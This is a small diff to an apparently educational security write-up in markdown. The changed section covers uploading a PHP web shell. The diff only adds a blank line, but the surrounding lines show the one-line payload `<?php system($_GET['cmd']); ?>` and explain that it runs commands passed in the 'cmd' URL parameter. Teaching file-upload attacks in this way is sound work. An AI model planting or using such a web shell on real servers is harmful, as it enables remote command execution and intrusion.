@@ -33,6 +33,7 @@ Try to upload PHP web shell
 **Payload:**`<?php system($_GET['cmd']); ?>`
 
 > 💡 **<?php system($_GET['cmd']); ?>**
+
 $**_GET** Can collect data that was sent in the URL or submitted in an HTML form.
 The command to be executed is obtained from the user's input via the $_GET superglobal array. In this case, the user is expected to pass the command as a query parameter named 'cmd' in the URL.
 
